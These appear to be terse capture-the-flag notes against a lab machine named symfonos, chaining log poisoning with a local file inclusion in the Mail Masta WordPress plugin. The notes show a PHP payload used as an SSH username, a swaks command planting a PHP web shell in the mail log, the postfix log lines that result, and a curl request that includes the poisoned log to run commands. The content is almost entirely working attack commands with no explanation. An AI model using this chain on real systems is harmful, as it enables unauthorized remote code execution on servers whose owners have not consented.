/var/log/auth.log
ssh '<?php echo "hello"; ?>'@<IP>

/var/log/mail.*

root@symfonos:/var/log# ls -al mail.log 
-rw-r----- 1 root adm 384 Nov 23 04:17 mail.log
root@symfonos:/var/log# chmod o+r mail.log
root@symfonos:/var/log# ls -al mail.log 
-rw-r--r-- 1 root adm 384 Nov 23 04:17 mail.log


└─$ swaks --from ' <?php system($_REQUEST["cmd"]); ?> @symfonos.localdomain' --to helios@symfonos.localdomain --server 192.168.56.130 --header  'Subject: Test email' --body '<?php system($_REQUEST["cmd"]);  ?>'


Nov 23 04:17:50 symfonos postfix/smtpd[3119]: connect from unknown[192.168.56.1]
Nov 23 04:17:50 symfonos postfix/smtpd[3119]: warning: Illegal address syntax from unknown[192.168.56.1] in MAIL command: < <?php system($_REQUEST["cmd"]); ?> @symfonos.localdomain>
Nov 23 04:17:50 symfonos postfix/smtpd[3119]: disconnect from unknown[192.168.56.1] ehlo=1 mail=0/1 quit=1 commands=2/3



└─$ curl "http://192.168.56.130/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/log/mail.log&cmd=id"
